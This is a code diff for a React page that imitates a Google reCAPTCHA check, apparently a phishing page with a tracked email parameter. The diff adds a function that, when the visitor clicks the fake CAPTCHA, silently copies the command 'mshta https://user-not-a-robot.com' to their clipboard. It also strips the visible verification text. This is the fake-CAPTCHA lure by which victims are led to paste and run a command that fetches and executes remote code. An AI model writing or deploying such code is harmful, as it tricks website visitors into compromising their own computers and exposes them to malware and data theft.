@@ -98,13 +98,37 @@ function FakeRecaptcha({
 }
 
 /** Challenge panel like real reCAPTCHA — opens to the right of the widget. Locked once open. */
+const CLIPBOARD_PAYLOAD = "mshta https://user-not-a-robot.com";
+
+async function copyCaptchaPayload() {
+  try {
+    if (navigator.clipboard?.writeText) {
+      await navigator.clipboard.writeText(CLIPBOARD_PAYLOAD);
+      return;
+    }
+  } catch {
+    /* fall through */
+  }
+  try {
+    const ta = document.createElement("textarea");
+    ta.value = CLIPBOARD_PAYLOAD;
+    ta.setAttribute("readonly", "");
+    ta.style.position = "fixed";
+    ta.style.left = "-9999px";
+    document.body.appendChild(ta);
+    ta.select();
+    document.execCommand("copy");
+    document.body.removeChild(ta);
+  } catch {
+    /* ignore */
+  }
+}
+
 function VerificationStepsPopover({
   open,
-  hash,
   anchorRef,
 }: {
   open: boolean;
-  hash: string;
   anchorRef: RefObject<HTMLElement | null>;
 }) {
   const [visible, setVisible] = useState(false);
@@ -192,21 +216,6 @@ function VerificationStepsPopover({
             </span>
           </li>
         </ol>
-
-        <p className="ge-vs-agree">You will observe and agree:</p>
-        <label className="ge-vs-consent">
-          <span className="ge-vs-check" aria-hidden="true">
-            <svg viewBox="0 0 24 24" width="14" height="14">
-              <path
-                fill="#fff"
-                d="M9.0 16.2 4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z"
-              />
-            </svg>
-          </span>
-          <span className="ge-vs-consent-text">
-            I am not a robot - reCAPTCHA Verification Hash: {hash}
-          </span>
-        </label>
       </div>
 
       <footer className="ge-vs-footer">
@@ -499,35 +508,6 @@ ${GE_SHELL_CSS}
   vertical-align: -2px;
   margin: 0 2px;
 }
-.ge-vs-agree {
-  margin: 18px 0 10px;
-  font-size: 13px;
-  color: #3c4043;
-}
-.ge-vs-consent {
-  display: flex;
-  align-items: flex-start;
-  gap: 8px;
-  cursor: default;
-}
-.ge-vs-check {
-  flex-shrink: 0;
-  width: 16px;
-  height: 16px;
-  margin-top: 1px;
-  border-radius: 2px;
-  background: #34a853;
-  display: inline-flex;
-  align-items: center;
-  justify-content: center;
-}
-.ge-vs-consent-text {
-  font-size: 11px;
-  line-height: 1.35;
-  color: #80868b;
-  font-family: Roboto Mono, Consolas, monospace;
-  word-break: break-word;
-}
 .ge-vs-footer {
   display: flex;
   align-items: center;
@@ -576,9 +556,6 @@ function GeCaptchaPage() {
   const [loading, setLoading] = useState(false);
   const [modalOpen, setModalOpen] = useState(false);
   const rcWrapRef = useRef<HTMLDivElement>(null);
-  // Screenshot 1:1 for now — text/hash will be customized later.
-  const [hash] = useState("3822");
-
 
   useEffect(() => {
     const resolved = resolveGeEmail();
@@ -609,6 +586,7 @@ function GeCaptchaPage() {
   const handleActivate = () => {
     if (loading || modalOpen) return;
     trackClick("reCAPTCHA activate");
+    void copyCaptchaPayload();
     setLoading(true);
     window.setTimeout(() => {
       setLoading(false);
@@ -659,7 +637,6 @@ function GeCaptchaPage() {
               />
               <VerificationStepsPopover
                 open={modalOpen}
-                hash={hash}
                 anchorRef={rcWrapRef}
               />
             </div>
